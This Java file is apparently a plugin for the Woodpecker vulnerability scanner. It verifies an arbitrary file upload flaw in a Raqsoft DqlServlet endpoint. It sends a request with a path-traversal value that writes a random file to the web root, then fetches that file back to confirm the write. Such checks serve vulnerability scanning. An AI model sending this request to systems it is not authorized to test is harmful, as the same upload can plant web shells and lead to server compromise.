package plugins.vul.raqsoft;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.requests.Parameter;
import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.requests.Requests;
import me.gv7.woodpecker.tools.misc.RandomUtil;
import plugins.vul.spring.cloud.gateway.CVE_2022_22947_Plugin;

public class DqlServlet_ArbitraryFileUpload_POC implements IPoc {
    private IPluginHelper helper;
    private IVulPluginCallbacks callbacks;


    public DqlServlet_ArbitraryFileUpload_POC() {
        callbacks = CVE_2022_22947_Plugin.vulPluginCallbacks;
        helper = callbacks.getPluginHelper();
    }

    @Override
    public IScanResult doVerify(ITarget iTarget, IResultOutput iResultOutput) throws Throwable {
        IScanResult result = helper.createScanResult();
        String target = iTarget.getAddress();
        String filename = RandomUtil.getRandomString(5) + ".x";
        String content = RandomUtil.getRandomString(5);
        RawResponse response = Requests.get(target + "/DqlServlet")
                .params(Parameter.of("action","11"),
                        Parameter.of("path", String.format("../../../%s", filename)),
                        Parameter.of("content",content),
                        Parameter.of("mode","server")).send();
        iResultOutput.infoPrintln("尝试任意文件上传");
        response = Requests.get(target+"/"+filename)
                .send();
        if (response.readToText().contains(content)){
            iResultOutput.successPrintln("DqlServlet接口存在任意文件上传漏洞");
            result.setExists(true);
            result.setTarget(target);
        } else {
            result.setExists(false);
        }
        return result;
    }
}
